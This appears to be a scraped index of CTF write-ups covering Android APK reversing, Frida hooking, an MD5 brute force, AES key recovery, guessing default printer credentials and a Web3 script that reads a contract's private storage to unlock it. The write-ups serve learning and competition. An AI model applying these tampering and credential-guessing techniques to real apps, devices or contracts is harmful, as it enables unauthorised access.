String[0]))))); } catch(Exception exp) { System.out.println(\"Exception: \"+exp.getMessage()); } } } ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:6:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"Solution Bingo. java Decrypt Solution: THCon21{Dyn@m1c_c0d3_l0@d1ng_1s_$c@ry} ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:7:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"How does it work? When the end-user selects Settings, this starts SettingsActivity. At some point, this calls method invoke on the SettingsActivity. This calls a method named executePayload. private final void executePayload() { ObjectRef classname = new ObjectRef(); classname.element = \"com.example.extlib.ExtClass\"; ObjectRef thedex = new ObjectRef(); StringBuilder v3 = new StringBuilder(); File v4 = this.getFilesDir(); Intrinsics.checkNotNullExpressionValue(v4, \"filesDir\"); thedex.element = v3.append(v4.getAbsolutePath()).append(\"/\").append(\"ExtClass.dex\").toString(); if((this.loadServerFiles()) \u0026\u0026 (this.integrityVerified(((String)thedex.element)))) { BuildersKt.runBlocking$default(null, ((Function2)new SettingsActivity.executePayload.1(this, thedex, classname, null)), 1, null); } } This method: Retrieves external files via loadServerFiles(). This downloads files.zip from a Google Drive. Then, it unzips the file and decrypts the DEX. Note the secret key and IV are different from the one used to decrypt inf.enc. Checks the integrity of the external DEX. This consists in checking the SHA256 hash against the expected one. Calls executePayload.1. This will load the DEX (with PathClassLoader, something I did not detect with DroidLysis at the time of the challenge), call initLib from the dynamic class, check if the smartphone is infected with isInfected and finally modify the wallpaper. ","date":"0001-01-01","objectID":"/2021-06-14-thcon/:8:0","tags":["THCon","CTF","2021","Android"],"title":"draw.per - THCon 2021","uri":"/2021-06-14-thcon/"},{"categories":null,"content":"Description This challenge was in the Misc category. While travelling to a conference in Paris, Herlock Sholmès sees a troubled police inspector. After asking him what was his problem, the inspector tells Herclock that he is trying to understand how two spies communicate with each other. Once every week both spies get on the Eiffel tower, but never get in speaking distance of each other. Generally one of them flies a drone for around twenty minutes, sometimes both of them do it. When questonned about it, they told it was for taking pictures, and provided the pictures in question when asked. Of course, nothing helpful came from these. The inspector hands Sholmès a file containing the last flight path of the drone. The flag of this challenge is THCon23{**SECRETMESSAGE**}, where **SECRETMESSAGE** is the message sent in that interaction, written in all caps without spaces. What is provided A trace file in text format, formatted as follows: date and time, GPS coordinate in degrees, minutes and seconds, and an altitude in feet. For instance, the beginning of the file: 2023/03/02-11:19:43 48°51'32.25\"N 2°17'42.66\"E 1002ft 2023/03/02-11:19:46 48°51'32.45\"N 2°17'42.97\"E 999ft 2023/03/02-11:19:49 48°51'32.57\"N 2°17'43.38\"E 1001ft 2023/03/02-11:19:52 48°51'32.57\"N 2°17'43.82\"E 1000ft 2023/03/02-11:19:55 48°51'32.45\"N 2°17'44.23\"E 1003ft 2023/03/02-11:19:58 48°51'32.25\"N 2°17'44.54\"E 995ft 2023/03/02-11:20:01 48°51'31.98\"N 2°17'44.71\"E 1003ft 2023/03/02-11:20:04 48°51'31.69\"N 2°17'44.71\"E 1002ft 2023/03/02-11:20:07 48°51'31.42\"N 2°17'44.54\"E 1001ft 2023/03/02-11:20:10 48°51'31.21\"N 2°17'44.23\"E 1000ft 2023/03/02-11:20:13 48°51'31.1\"N 2°17'43.82\"E 995ft First idea My first idea was that the drone was tracing something interesting, or going to noticeable geographical points. So, I decided to convert the txt file to a GPX trace to be opened in google earth The conversion code is not complex to be done, but takes time, so I decided to use ChatGPT 4. My question: The answer given by ChatGPT produces a fully operational code that produces a GPX trace. import java.io.BufferedReader; import java.io.BufferedWriter; import java.io.FileReader; import java.io.FileWriter; import java.io.IOException; import java.text.ParseException; import java.text.SimpleDateFormat; import java.util.Date; public class TextToGPX { public static void main(String[] args) { String inputFileName = \"input.txt\"; String outputFileName = \"output.gpx\"; try (BufferedReader br = new BufferedReader(new FileReader(inputFileName)); BufferedWriter bw = new BufferedWriter(new FileWriter(outputFileName))) { bw.write(\"\u003c?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?\u003e\\n\"); bw.write(\"\u003cgpx version=\\\"1.1\\\" creator=\\\"TextToGPX\\\"\\n\"); bw.write(\" xmlns=\\\"http://www.topografix.com/GPX/1/1\\\"\\n\"); bw.write(\" xmlns:xsi=\\\"http://www.w3.org/2001/XMLSchema-instance\\\"\\n\"); bw.write(\" xsi:schemaLocation=\\\"http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd\\\"\u003e\\n\"); bw.write(\"\u003ctrk\u003e\\n\"); bw.write(\"\u003ctrkseg\u003e\\n\"); String line; SimpleDateFormat sdf = new SimpleDateFormat(\"yyyy/MM/dd-HH:mm:ss\"); while ((line = br.readLine()) != null) { String[] parts = line.split(\"\\\\s+\"); Date dateTime = sdf.parse(parts[0]); String isoDateTime = new SimpleDateFormat(\"yyyy-MM-dd'T'HH:mm:ss'Z'\").format(dateTime); double latitude = dmsToDecimal(parts[1]); double longitude = dmsToDecimal(parts[2]); double elevation = Double.parseDouble(parts[3].substring(0, parts[3].length() - 2)) * 0.3048; bw.write(String.format(\"\u003ctrkpt lat=\\\"%s\\\" lon=\\\"%s\\\"\u003e\\n\", latitude, longitude)); bw.write(String.format(\" \u003cele\u003e%.2f\u003c/ele\u003e\\n\", elevation)); bw.write(String.format(\" \u003ctime\u003e%s\u003c/time\u003e\\n\", isoDateTime)); bw.write(\"\u003c/trkpt\u003e\\n\"); } bw.write(\"\u003c/trkseg\u003e\\n\"); bw.write(\"\u003c/trk\u003e\\n\"); bw.write(\"\u003c/gpx\u003e\\n\"); } catch (IOException | ParseException e) { e.printStackTrace(); } } public static double dmsToDecimal(String dmsCoordinate) { String[] dmsElements = dmsCoordinate.split(\"[°'\\\"NSEW]+\"); double degrees = Double.parseDouble(dmsElements[0]); d","date":"0001-01-01","objectID":"/2023-04-22-drone/:0:0","tags":["THCon","CTF","2023","Misc"],"title":"Drone and secret message (THCon CTF 2023)","uri":"/2023-04-22-drone/"},{"categories":null,"content":"This was a different type of challenge, in between regular Escape Rooms/ Geo-caching and CTF. 11 different challenges were scattered nearby the CTF room, and you needed to solve at least 10 of these challenges to be able to recover a code to unlock a safe where you’d find a flag for the Exploit Quest. The challenges weren’t too difficult, but I found this rather long and was happy to complete the task with @IdleWog (mushd00m team). Mirror (Spot 11) The following image was taped on a desk. Put this image in front of a mirror and you’d get the following sentence “A flag is wandering in the air of the Palexpo enclosure” (Palexpo is the venue for Insomni’hack). Except at first, I read “atm” instead of “air” and so, we went on a chase for all ATMs close to Palexpo. Some organizers didn’t understand our sudden urge to find an ATM ;-) “In the air”. Wifi! Indeed, we quickly located a Wifi with a SSID whose name was one of the 11 codes to figure out: 11-dc33d799b081904f876223e3 WhatsApp (Spot 5) The following business card could be found on spot #5. The name was obviously fake, so we sent an SMS to the guy (no answer), called the phone number (answering machine). In the end, the solution was to try this phone number in WhatsApp: the avatar for Rocky Sifredo would show a QR-code. Scan this, and get another code: 05-4c259c544404945c337876f1 Printer (Spot 4) We connected to a router and found a printer on 192.168.1.3. There is an HTTP service and a FTP service running. We need credentials to login. We try a couple of basic choices admin:root (etc) and the solution is xerox:xerox. We connect via FTP, list the directory, a file flag is present and contains the code: 04-ca118e93e1041374558377b9 Webcam (Spot 1) We connect to the same router as for spot 4. There is a webcam on 192.168.1.2 available via HTTP. To view the live stream, you need a web plugin, and it is not available on Linux. We solve this by using Internet Explorer on Windows :( The webcam’s live feed shows 3 QR codes. We have to create a QR code using those 3 layers. Actually, we messed up here, but somebody told us Snapchat did the trick. ","date":"0001-01-01","objectID":"/2019-03-23-exploitquest/:0:0","tags":["insomnihack","CTF"],"title":"Exploit Quest - Insomni'hack CTF 2019","uri":"/2019-03-23-exploitquest/"},{"categories":null,"content":"Poster (Spot 7) On this spot, there is a large poster of a previous edition of Insomni’hack. The poster is protected by a barrier, suggesting we do not need to actually touch the poster. We inspect the poster and find a barcode has been inserted on the headset: We scan this barcode, and get the code 07-781d3ea51dd60ca93049fa0a Box (Spot 2) This spot features a strange box with a partial code on it. Taking a picture of the box, I notice that there are lights showing up in a given pattern which give the clue for the remainder of the code: 02-6c016ba3f010e920f239378a. Oops, I don’t remember more about the code :( NFC (Spot 8) This spot is worn by one of the organizers. The text suggests we will need NFC and to coerce the organizer to reveal the token. I’m lucky, it is already 1am, and the organizer is tired and shows us the token immediately. We scan, and get the code. Zelda The following sign was on this spot: @IdleWog quickly recognized Zelda’s logo. We search for the font online, type in each character and get another code. Music Safe You enter a white room with a safe protected by a PIN pad. There is nothing else in the room. We had a look underneath the safe (it wasn’t very heavy!), searched for Bluetooth data, Wifi etc. Nothing. Another team came in, and they solved the challenge in a few seconds. We hadn’t noticed a music was playing. Just listen, open Shazam on your smartphone and get a code for the song. This was the pin code for the safe. Open it and get the code… Other spots There were some other spots I don’t exactly remember: Lockpicking. @IdleWog opened the box very fast and retrieved the code. A QR-code to scan in another place. Would simply provide the code. Assembling the codes An organizer told us the codes should be re-assembled using an algorithm made by one of the researchers of RSA. Shamir. We found a Python library for Shamir secret sharing. It should have worked but did not :( Finally, we used this online website, entered 10 shares and combined them to get the PIN to open the final safe We opened the safe, found a QR code that we opened, and finally got the flag for this challenge! This challenge was amusing, and different from the other traditional challenges. I liked it. The only thing I did not like too much was that many quests depending on having the right tool (a NFC smartphone, a smartphone with the appropriate barcode/QR code reader, Shazam etc) and not so much about thinking/deducing. ","date":"0001-01-01","objectID":"/2019-03-23-exploitquest/:1:0","tags":["insomnihack","CTF"],"title":"Exploit Quest - Insomni'hack CTF 2019","uri":"/2019-03-23-exploitquest/"},{"categories":null,"content":"Flagdroid 147 solves 153 points Easy Category: Reverse Author: m0ney Text: “This app won’t let me in without a secret message. Can you do me a favor and find out what it is?” Download file: an APK ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:0:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Analysis of the app We decompile the application. The validation of the flag is done when you press the button check: public void onClick(View arg10) { TextView tvWrong = (TextView)MainActivity.this.findViewById(0x7F0700EC); // id:textViewWrong TextView tvCorrect = (TextView)MainActivity.this.findViewById(0x7F0700EB); // id:textViewCorrect String secretInput = ((EditText)MainActivity.this.findViewById(0x7F0700C4)).getText().toString(); // id:secretInput Matcher match = Pattern.compile(\"flag\\\\{(.*)\\\\}\").matcher(secretInput); if(match.find()) { String[] flagcore = match.group().replace(\"flag{\", \"\").replace(\"}\", \"\").split(\"_\"); if(flagcore.length == 4 \u0026\u0026 ((MainActivity.this.checkSplit1(flagcore[0])) \u0026\u0026 (MainActivity.this.checkSplit2(flagcore[1])) \u0026\u0026 (MainActivity.this.checkSplit3(flagcore[2])) \u0026\u0026 (MainActivity.this.checkSplit4(flagcore[3])))) { tvWrong.setVisibility(4); tvCorrect.setVisibility(0); return; } } The flag is surrounded by flag{...} and each part is separated by a _. There are 4 different parts. Each part is validated by a method checkSplitX() where X is the number of the split. ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:1:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"First part It is a base64 string dEg0VA==: tH4T ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:2:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Second part The second part is created from an algorithm that: checks the length is 9 performs a translation on the character XORs the result with a fixed key hack.lu20 To do the decode, we must do it the other way: public static String createSplit2() { try { String s = new String(\"\\u001fTT:\\u001f5\\u00f1HG\"); char[] v8 = s.toCharArray(); byte[] key = \"hack.lu20\".getBytes(\"UTF-8\"); int v3; for(v3 = 0; v3 \u003c 9; ++v3) { v8[v3] = (char)(v8[v3] ^ key[v3]); v8[v3] = (char)(v8[v3] - v3); } System.out.println(\"Result: \"+ String.valueOf(v8)); return new String(v8); } catch(UnsupportedEncodingException unused_ex) { System.out.println(\"Exception\"); } return null; } The main difficulty is to copy paste the Unicode string correctly… Result: w45N-T~so ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:3:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Third part We know the part consists of 8 characters. The first four are h4rd, possibly with a different case. The last 4 characters are not given, but we know the MD5 of the string must be 6d90ca30c5de200fe9f671abb2dd704e. We search for the string on MD5 reverse but it is not known So, we brute force it. import hashlib prefix = 'h4rd' for a in ['h', 'H']: for b in ['r', 'R']: for c in ['d', 'D']: for i in range(ord('-'), ord('~')+1): for j in range(ord('-'), ord('~')+1): for k in range(ord('-'), ord('~')+1): for l in range(ord('-'), ord('~')+1): s = a + '4' + b + c + chr(i) + chr(j) + chr(k) + chr(l) print(\"Testing: {0}\".format(s)) value = hashlib.md5(bytes(s,'utf-8')).hexdigest() if value == \"6d90ca30c5de200fe9f671abb2dd704e\": print(\"FOUND: {0}\".format(s)) quit() Result: Testing: h4rd~hue Testing: h4rd~huf Testing: h4rd~hug Testing: h4rd~huh FOUND: h4rd~huh ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:4:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Fourth part The last part of the flag is given by a native function stringFromJNI. We write a Frida hook for that: 'use strict'; console.log(\"[*] INSIDE native-lib.js\"); global.run = function () { console.log(\"[debug] global.run: Java.available=\"+Java.available); Java.perform(function () { var mainClass = Java.use(\"lu.hack.Flagdroid.MainActivity\"); mainClass.stringFromJNI.implementation = function() { console.log(\"[*] Hooking\"); var ret = this.stringFromJNI(); console.log(\"ret=\"+ret); return ret; } mainClass.checkSplit1.implementation = function(b) { var ret = this.stringFromJNI(); console.log(\"ret=\"+ret); return this.checkSplit1(b); } console.log(\"[*] loaded hooks - v4\"); }); }; Then, we launch the Frida server on the smartphone, launch the app, and on the laptop, launch Frida client: frida -U -l native-lib.js -n lu.hack.Flagdroid [*] Hooking ret=0r~w4S-1t?8) ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:5:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Final solution flag{tH4T_w45N-T~so_h4rd~huh_0r~w4S-1t?8)} ","date":"0001-01-01","objectID":"/2020-10-28-flagdroid/:6:0","tags":["hack.lu","CTF","2020","Android"],"title":"Flagdroid - Hack.Lu CTF 2020","uri":"/2020-10-28-flagdroid/"},{"categories":null,"content":"Good old friend The challenge provides an Android APK. ","date":"0001-01-01","objectID":"/2021-06-14-thcon-goodold/:0:0","tags":["THCon","CTF","2021","Android","Native"],"title":"Good old friend - THCon 2021","uri":"/2021-06-14-thcon-goodold/"},{"categories":null,"content":"Reversing the APK The main activity of this APK is party.thcon.y2021.level1.MainActivity. Its onCreate() method does the following: Anti-debug. If the app is being debugged, display an alert dialog saying “Find another way” and quit. if((this.getApplicationInfo().flags \u0026 2) != 0) { this.findanotherway(\"App is debuggable\"); } Anti-root. Search for su in the PATH of the system. If it is not found, search for rooting apps or binaries such as Superuser.apk, /system/xbin/daemonsu etc. If either are found, display the alert window and quit. if(thereissu == 0 \u0026\u0026 (Build.TAGS == null || !Build.TAGS.contains(\"test-keys\"))) { String[] v4 = {\"/system/app/Superuser.apk\", \"/system/xbin/daemonsu\", \"/system/etc/init.d/99SuperSUDaemon\", \"/system/bin/.ext/.su\", \"/system/etc/.has_su_daemon\", \"/system/etc/.installed_su_daemon\", \"/dev/com.koushikdutta.superuser.daemon/\"}; int v1 = 0; while(v1 \u003c 7) { if(new File(v4[v1]).exists()) { ... if(v2 != 0) { this.findanotherway(\"Device is rooted\"); } Ask for a password and when the main check button is pressed, call a listener b(): this.checkbtn.setOnClickListener(new b(this)); The listener calls checkInput() and displays “Correct” or “Wrong”: public final void onClick(View arg4) { String v1; String v0; MainActivity mainactivity = this.main; if(mainactivity.checkInput(mainactivity.password.getText().toString()) == 0) { v0 = \"Correct!\"; v1 = \"You can use this password to validate the challenge\"; } else { v0 = \"Wrong!\"; v1 = \"Try again.\"; } new AlertDialog.Builder(mainactivity).setTitle(v0).setMessage(v1).setPositiveButton(\"OK\", null).create().show(); } The method checkInput() is native, and loaded from the library native-lib: public static { System.loadLibrary(\"native-lib\"); } public native int checkInput(String arg1) {} The argument to checkInput is the password the end-user supplies for verification. ","date":"0001-01-01","objectID":"/2021-06-14-thcon-goodold/:1:0","tags":["THCon","CTF","2021","Android","Native"],"title":"Good old friend - THCon 2021","uri":"/2021-06-14-thcon-goodold/"},{"categories":null,"content":"Reversing the native library So, we need to reverse the library. If we unpack the APK, it is located in the ./lib subdirectory, and we find a library for ARM and x86 architectures. I usually prefer ARM, but x86 is often decompiled better by decompilers. With JEB, I try to decompile the armeabi-v7a library. I focus on the exported function Java_party_thcon_y2021_level1_MainActivity_checkInput, which corresponds to the JNI for our native method checkInput. The decompilation is not perfect, but I understand the check routine performs AES CBC encryption with a fixed IV and key on the password, and checks that the encrypted result matches the expected one. AES_init_ctx_iv((int)\u0026ctx, (int)\u0026iv, (int)\u0026v1, len); AES_CBC_encrypt_buffer((int)\u0026ctx, (int)\u0026v2, v15, len); size_t __n = (size_t)min(v15, 32); int v16 = memcmp((void*)0x26FC0, \u0026v2, __n); if(v16 != 0) { android_log_print(3, \"MyLib\", \"FAILURE!\\n\"); result = 1; } else { android_log_print(3, \"MyLib\", \"SUCCESS!\\n\"); result = 0; } So, we just need to located the IV, the key and the expected result. The expected result is easily located with JEB at 0x26FC0: It is e47bc2dffaa645cb89a87780bb1619ef5daa2aadf4cda3ebd1884e64a2b43b68. However, the key and IV are obscure with JEB… VLD1.64((unsigned long long)v10, (unsigned long long)(v10 \u003e\u003e\u003e 0x40X), 159648); VST1.64((unsigned long long)v10, (unsigned long long)(v10 \u003e\u003e\u003e 0x40X), \u0026iv); VLD1.64((unsigned long long)v10, (unsigned long long)(v10 \u003e\u003e\u003e 0x40X), 159664); VST1.64((unsigned long long)v10, (unsigned long long)(v10 \u003e\u003e\u003e 0x40X), \u0026v1); aeabi_memclr8(\u0026v2, 1000); int v12 = (unsigned int)v8; int v13 = 0; while(1) { int v14 = min(v12 * 0x80000000 == 0 ? (unsigned int)(unsigned char)v12 \u003e\u003e\u003e 1: v3, 1000); v12 = (unsigned int)v8; if(v14 \u003c= v13) { break; } else { *(char*)(v13 + (int)\u0026v2) = *(char*)((int)((v12 \u0026 0x1) == 0 ? \u0026v5: ptr0) + v13); ++v13; } } So, I head to Ghidra. As decompilers often process x86 better, I use the x86 library this time. In AES_init_ctx_inv, the first argument is a context structure, the second is the key (local_28), and the third is the IV (local_38). AES_init_ctx_iv(aAStack1248,(uchar *)\u0026local_28,(uchar *)\u0026local_38); AES_CBC_encrypt_buffer(aAStack1248,auStack1056,uVar4); With Ghidra, the values for the key and IV are easily to find. They are hard-coded: local_1c = 0x3c4fcf09; local_20 = 0x8815f7ab; local_24 = 0xa6d2ae28; local_28 = 0x16157e2b; local_2c = 0xf0e0d0c; local_30 = 0xb0a0908; local_34 = 0x7060504; local_38 = 0x3020100; The IV is 000102030405060708090a0b0c0d0e0f. The key is 2b7e151628aed2a6abf7158809cf4f3c. ","date":"0001-01-01","objectID":"/2021-06-14-thcon-goodold/:2:0","tags":["THCon","CTF","2021","Android","Native"],"title":"Good old friend - THCon 2021","uri":"/2021-06-14-thcon-goodold/"},{"categories":null,"content":"Decrypting from Crypto.Cipher import AES key = bytes.fromhex('2b7e151628aed2a6abf7158809cf4f3c') iv = bytes.fromhex('000102030405060708090a0b0c0d0e0f') ciphertext = bytes.fromhex('e47bc2dffaa645cb89a87780bb1619ef5daa2aadf4cda3ebd1884e64a2b43b68') cipher = AES.new(key, AES.MODE_CBC, iv) plaintext = cipher.decrypt(ciphertext) print(plaintext) This displays: b'THCon21{C_1$_n3v3r_2_f@r}\\x00\\x00\\x00\\x00\\x00\\x00\\x00'. The flag is THCon21{C_1$_n3v3r_2_f@r}. Sadly, I did not flag this challenge on time, because of a typo in the key I never saw… ","date":"0001-01-01","objectID":"/2021-06-14-thcon-goodold/:3:0","tags":["THCon","CTF","2021","Android","Native"],"title":"Good old friend - THCon 2021","uri":"/2021-06-14-thcon-goodold/"},{"categories":null,"content":"Hashfun “I guess there is no way to recover the flag” and a Python program is provided: from secret import FLAG def hashfun(msg): digest = [] for i in range(len(msg) - 4): digest.append(ord(msg[i]) ^ ord(msg[i + 4])) return digest print(hashfun(FLAG)) # [10, 30, 31, 62, 27, 9, 4, 0, 1, 1, 4, 4, 7, 13, 8, 12, 21, 28, 12, 6, 60] ","date":"0001-01-01","objectID":"/2020-10-31-hashfun/:0:0","tags":["CSR","CTF","2020","Crypto","Python"],"title":"Hashfun - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-hashfun/"},{"categories":null,"content":"Understanding the algorithm So this is an alleged hash function. The flag is not provided and part of the FLAG module. However, we have the resulting digest for the flag: [10, 30, 31, 62, 27, 9, 4, 0, 1, 1, 4, 4, 7, 13, 8, 12, 21, 28, 12, 6, 60]. The digest consists in XORing a character with one 4 spaces later. ","date":"0001-01-01","objectID":"/2020-10-31-hashfun/:1:0","tags":["CSR","CTF","2020","Crypto","Python"],"title":"Hashfun - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-hashfun/"},{"categories":null,"content":"The flaw We know the flag begins with CSR{ and ends with }. Actually, we just need to know it begins with CSR{. So, we can compute the next 4 characters of the flag. Indeed we have: C xor flag[4] = 10 S xor flag[5] = 30 R xor flag[6] = 31 { xor flag[7] = 62 This gives us flag[4] = C xor 10 = I etc. Then, again, we are able to compute the next 4 characters! E.g flag[4] xor flag[8] = 27, so flag[8] = flag[4] xor 27 = I xor 27 = R. Etc until the end of the hash. And we will be able to check our algorithm is correct if we recover ‘}’ for the last character of the flag. ","date":"0001-01-01","objectID":"/2020-10-31-hashfun/:2:0","tags":["CSR","CTF","2020","Crypto","Python"],"title":"Hashfun - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-hashfun/"},{"categories":null,"content":"Implementation thehash = [10, 30, 31, 62, 27, 9, 4, 0, 1, 1, 4, 4, 7, 13, 8, 12, 21, 28, 12, 6, 60] prefix = 'CSR{' flag = [] key = prefix for i in range(0, len(thehash), 4): for j in range(0, 4): if i + j \u003e= len(thehash): break flag.append(chr(ord(key[j]) ^ thehash[i+j])) if i + 4 \u003e= len(thehash): break key = flag[i:i+4] print(\"The flag is: {}{}\".format(prefix, ''.join(flag))) The flag is: CSR{IMMERDIESEMATHEMATIK} ","date":"0001-01-01","objectID":"/2020-10-31-hashfun/:3:0","tags":["CSR","CTF","2020","Crypto","Python"],"title":"Hashfun - Cyber Security Rumble CTF 2020","uri":"/2020-10-31-hashfun/"},{"categories":null,"content":"Description The challenge provides the following contract, and, same as the Welcome challenge, the goal is to “unlock” to get the flag. pragma solidity ^0.7.1; contract hidden { bool public isLocked; bytes32 private key; bool private other; uint256 private garbage = 88888888888; uint256 public useless; uint256 private bob; constructor() { //hidden } function unlock(bytes32 _something) public { require(other); if (key == _something) { isLocked = false; } } } Solving the challenge Like in the previous challenge, to unlock, we need a key, except this time it is private: bytes32 private key; ... function unlock(bytes32 _something) public { require(other); if (key == _something) { isLocked = false; } } So, we’re going to read the key (exactly the way I had intended to do it initially with Welcome) using get_storage_at. The storage probably holds the key at index 1: bool public isLocked; # index 0 bytes32 private key; # index 1 bool private other; # index 2 ... The first step is to get the ABI of the contract, using solc. That’s a step I grasped from Sylvain Pelissier at Insomni’hack CTF: solc nothingtohide.sol --abi \u003e abi.json For the command to work, in my case, I had to fix the solidity pragma to pragma solidity ^0.8.19;. Then I copy-pasted the Json array in my Python script. Then, you deploy the contract on the CTF infrastructure and retrieve the contact’s address. My script is very inspired from Sylvain’s: Connect to the RPC URL Get the contract, using its address Read the key from storage Send the transaction To send the transaction, you need your private key. You can retrieve it from the Metamask wallet you created for the CTF: #!/usr/bin/env python3 from web3 import Web3 # solc nothingtohide.sol --abi \u003e abi.json - then copy paste content of abi.json here abi = [{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"isLocked\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"_something\",\"type\":\"bytes32\"}],\"name\":\"unlock\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"useless\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}] # connect to the CTF RPC URL url = 'https://node01-eth.ctf.thcon.party:8545' web3 = Web3(Web3.HTTPProvider(url)) # I am logged in the CTF interface with this personal address my_address = web3.to_checksum_address('0xc8fe...') # The contract is deployed at this address contract_address = web3.to_checksum_address('0xb9eE2C6DBa64e2dc3FE7e78aEE8e34FBb33FcAA3') contract = web3.eth.contract(address=contract_address, abi=abi) # Read the key from the contract key_bytes = web3.eth.get_storage_at(contract_address,1) print(f\"key bytes: {key_bytes}{len(key_bytes)}\") # b' \\xfa\\xbb\\xc0f0e\\xde\\x90\\x9de\\xa3\\x02D\\xd2\\xb4\\x1eE\\x10\\xa3`\\xe7\\xd5\\xb0xA\\xbb\\x90\\x8a\\xd5z\\x9f' # create transaction print('Creating transaction...') transfer_tx = contract.functions.unlock(key_bytes).build_transaction( { 'from': my_address, 'nonce': web3.eth.get_transaction_count(my_address), 'gasPrice': web3.eth.gas_price }) # signing the transaction with my personal wallet's private key (in Metamask) print(\"Signing transaction...\") x_create = web3.eth.account.sign_transaction(transfer_tx, 0x863ce...) # sending the transaction - for that I need a few tokens at least that I can mine on the CTF interface print('Send raw...') tx_hash = web3.eth.send_raw_transaction(x_create.rawTransaction) print('Receipt') tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash) print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }') This unlocks the contract, and thus, when you go back to the CTF interface, you get the flag :) My feedback Actually, I flagged this challenge more easily / quickly than Welcome, because I had some prior (small) experience with Web3 python scripts. Nevertheless, I liked it very much: I find the ","date":"0001-01-01","objectID":"/2023-04-22-nothingtohide/:0:0","tags":["THCon","CTF","2023","Web3","Ethereum"],"title":"Nothing to Hide (THCon CTF 2023)","uri":"/2023-04-22-nothingtohide/"},{"categories":null,"content":"Pycoin - Hack.lu 2021 This is what we know: PYCOIN Sold: 92 times Type: rev Risk: Low Seller: tunn3l A friend gave me this and he says he can not reverse this... but this is just python? and we get a .pyc file and a hint flag[5] == \"5\" . I unfortunately did not solve this challenge on time for the CTF but found it interesting (I got stuck trying to disassemble with dis and did not know xdis did the work). Thanks to tunn3l, TheBadGod, crabbers and crazyman for their help elaborating this write-up. Solution There is another write-up here, but I didn’t find it detailed enough to understand how to solve the challenge. Hopefully a better attempt below! ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:0:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Uncompyle I used uncompyle6 to transform the .pyc to .py: uncompyle6 pycoin.pyc \u003e uncompiled.py. The resulting source code is still obscure: import marshal marshalled = b'\\xe3\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00.... ' exec(marshal.loads(marshalled)) ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:1:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Marshal Marshal is an internal Python object serialization module. If we have a look at the marshalled string, we see it is actually Python byte code from a file named disassembly. \u003e\u003e\u003e redata = marshal.loads(marshalled) \u003e\u003e\u003e print(redata) \u003ccode object \u003cmodule\u003e at 0x7efedf31e9d0, file \"\u003cdisassembly\u003e\", line 1\u003e By scanning the marshalled string more in details, we spot strings the program asks: please supply a valid key: valid key! invalid key : and obviously there is MD5 hashing involved (spot md5, digest etc): xda\\x03md5z \\xda\\x06digestZ\\ ... ","date":"0001-01-01","objectID":"/2021-11-04-hacklu-pycoin/:2:0","tags":["Hack.lu","CTF","2021","Python","Bytecode","Reverse"],"title":"pycoin - Hack.lu 2021","uri":"/2021-11-04-hacklu-pycoin/"},{"categories":null,"content":"Disassembling Python bytecode Unfortunately, the regular dis disassembler does not work: \u003e\u003e\u003e dis.disassemble(redata) 1 0 JUMP_FORWARD 2 (to 4) Traceback (most recent call last): File \"\u003cstdin\u003e\", line 1, in \u003cmodule\u003e File \"/usr/lib/python3.8/dis.py\", line 369, in disassemble _disassemble_bytes(co.co_code, lasti, co.co_varnames, co.co_names, File \"/usr/lib/python3.8/dis.py\", line 401, in _disassemble_bytes for instr in _get_instructions_bytes(code, varnames, names, File \"/usr/lib/python3.8/dis.py\", line 340, in _get_instructions_bytes argval, argrepr = _get_name_info(arg, names) File \"/usr/lib/python3.8/dis.py\", line 304, in _get_name_info argval = name_list[name_index] IndexError: tuple index out of range The solution consists in using xdis which handles python bytecode from multiple versions. \u003e\u003e\u003e import xdis.std as dis \u003e\u003e\u003e dis.dis(redata) 